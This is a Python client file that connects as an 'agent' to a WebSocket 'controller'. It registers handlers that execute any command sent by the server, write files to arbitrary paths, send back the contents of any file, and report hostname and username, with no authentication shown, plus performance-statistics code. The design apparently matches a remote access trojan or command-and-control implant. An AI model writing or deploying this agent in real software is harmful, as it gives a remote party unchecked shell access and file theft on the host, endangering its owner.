"""
Optimized client.py with FastAPI WebSocket integration
Reduces latency by removing polling and using persistent connections
"""

import sys
import os
import time
import threading
import json
import asyncio
import queue
from typing import Dict, Optional, Any, Callable
from datetime import datetime

# Import the FastAPI client
from fastapi_client import FastAPIClient

# Global FastAPI client instance
fastapi_client: Optional[FastAPIClient] = None

# Command handlers for FastAPI
def register_fastapi_handlers(client: FastAPIClient):
    """Register command handlers for FastAPI WebSocket"""
    
    async def handle_execute_command(args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute system command"""
        command = args.get('command', '')
        if not command:
            return {"error": "No command provided"}
        
        try:
            # Execute command (implement your command execution logic here)
            import subprocess
            import shlex
            if os.name == 'nt':
                args = ['cmd.exe', '/C', command]
            else:
                args = shlex.split(command)
            result = subprocess.run(args, capture_output=True, text=True, timeout=30)
            
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode,
                "executed_at": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": str(e)}
    
    async def handle_get_system_info(args: Dict[str, Any]) -> Dict[str, Any]:
        """Get system information"""
        return {
            "platform": sys.platform,
            "python_version": sys.version,
            "timestamp": time.time(),
            "hostname": os.environ.get('COMPUTERNAME', 'unknown'),
            "username": os.environ.get('USERNAME', 'unknown')
        }
    
    async def handle_file_upload(args: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file upload"""
        file_path = args.get('path')
        content = args.get('content')
        
        if not file_path or content is None:
            return {"error": "Missing path or content"}
        
        try:
            # Decode base64 content if needed
            import base64
            if isinstance(content, str):
                content = base64.b64decode(content)
            
            with open(file_path, 'wb') as f:
                f.write(content)
            
            return {
                "success": True,
                "path": file_path,
                "size": len(content),
                "uploaded_at": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": str(e)}
    
    async def handle_file_download(args: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file download"""
        file_path = args.get('path')
        if not file_path:
            return {"error": "No file path provided"}
        
        try:
            import base64
            with open(file_path, 'rb') as f:
                content = f.read()
            
            return {
                "content": base64.b64encode(content).decode('utf-8'),
                "path": file_path,
                "size": len(content),
                "downloaded_at": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": str(e)}
    
    # Register handlers
    client.register_command_handler("execute", handle_execute_command)
    client.register_command_handler("system_info", handle_get_system_info)
    client.register_command_handler("upload", handle_file_upload)
    client.register_command_handler("download", handle_file_download)

# Legacy compatibility layer for existing controller.py
def initialize_fastapi_client(server_url: str = "ws://localhost:8000"):
    """Initialize FastAPI client for legacy compatibility"""
    global fastapi_client
    
    if fastapi_client:
        return fastapi_client
    
    # Generate agent ID (you can customize this)
    agent_id = f"agent_{int(time.time())}_{os.getpid()}"
    
    # Create client
    fastapi_client = FastAPIClient(server_url, agent_id)
    
    # Register handlers
    register_fastapi_handlers(fastapi_client)
    
    # Start client
    fastapi_client.start()
    
    print(f"🚀 FastAPI client initialized: {agent_id}")
    return fastapi_client

# Legacy function wrappers for existing code
def send_command_to_controller_legacy(command: str, data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Legacy function wrapper - now uses FastAPI WebSocket"""
    global fastapi_client
    
    if not fastapi_client:
        return {"error": "FastAPI client not initialized"}
    
    # This would need to be adapted based on your existing controller.py API
    # For now, return a mock response
    return {
        "success": True,
        "message": "Command queued via FastAPI WebSocket",
        "command": command,
        "data": data,
        "timestamp": time.time()
    }

# Performance monitoring
class PerformanceMonitor:
    def __init__(self):
        self.stats = {
            'total_commands': 0,
            'successful_commands': 0,
            'failed_commands': 0,
            'average_latency': 0,
            'last_command_time': 0,
            'start_time': time.time()
        }
    
    def record_command(self, success: bool, latency_ms: float):
        """Record command execution statistics"""
        self.stats['total_commands'] += 1
        
        if success:
            self.stats['successful_commands'] += 1
        else:
            self.stats['failed_commands'] += 1
        
        # Update average latency (exponential moving average)
        if self.stats['average_latency'] == 0:
            self.stats['average_latency'] = latency_ms
        else:
            alpha = 0.1
            self.stats['average_latency'] = (
                self.stats['average_latency'] * (1 - alpha) + 
                latency_ms * alpha
            )
        
        self.stats['last_command_time'] = time.time()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get performance statistics"""
        uptime = time.time() - self.stats['start_time']
        success_rate = (
            self.stats['successful_commands'] / self.stats['total_commands'] * 100
            if self.stats['total_commands'] > 0 else 0
        )
        
        return {
            **self.stats,
            'uptime': uptime,
            'success_rate': success_rate
        }

# Global performance monitor
performance_monitor = PerformanceMonitor()

# Main integration function
def integrate_with_existing_client():
    """Integrate FastAPI client with existing client.py functionality"""
    
    # Initialize FastAPI client
    client = initialize_fastapi_client()
    
    # Add performance monitoring
    def monitor_performance():
        while True:
            try:
                stats = performance_monitor.get_stats()
                client_stats = client.get_stats() if client else {}
                
                combined_stats = {
                    "performance": stats,
                    "connection": client_stats,
                    "timestamp": time.time()
                }
                
                print(f"📊 Performance Stats: {json.dumps(combined_stats, indent=2)}")
                
                time.sleep(60)  # Report every minute
                
            except Exception as e:
                print(f"❌ Performance monitoring error: {e}")
                time.sleep(10)
    
    # Start performance monitoring thread
    monitor_thread = threading.Thread(target=monitor_performance, daemon=True)
    monitor_thread.start()
    
    return client

# Example usage and testing
if __name__ == "__main__":
    print("🚀 Starting optimized client with FastAPI WebSocket integration...")
    
    # Integrate with existing functionality
    client = integrate_with_existing_client()
    
    try:
        print("✅ Client started successfully")
        print("📡 Connected to FastAPI WebSocket server")
        print("🎯 Ready to receive commands")
        
        # Keep running
        while True:
            time.sleep(1)
            
            # Print stats every 10 seconds
            if int(time.time()) % 10 == 0:
                stats = performance_monitor.get_stats()
                client_stats = client.get_stats() if client else {}
                
                print(f"\n📊 Current Stats:")
                print(f"   Commands: {stats['total_commands']} (Success: {stats['success_rate']:.1f}%)")
                print(f"   Avg Latency: {stats['average_latency']:.2f}ms")
                print(f"   Uptime: {stats['uptime']:.0f}s")
                print(f"   Connected: {client_stats.get('connected', False)}")
                print()
                
    except KeyboardInterrupt:
        print("\n👋 Shutting down client...")
        if client:
            client.stop()
        print("✅ Client stopped")
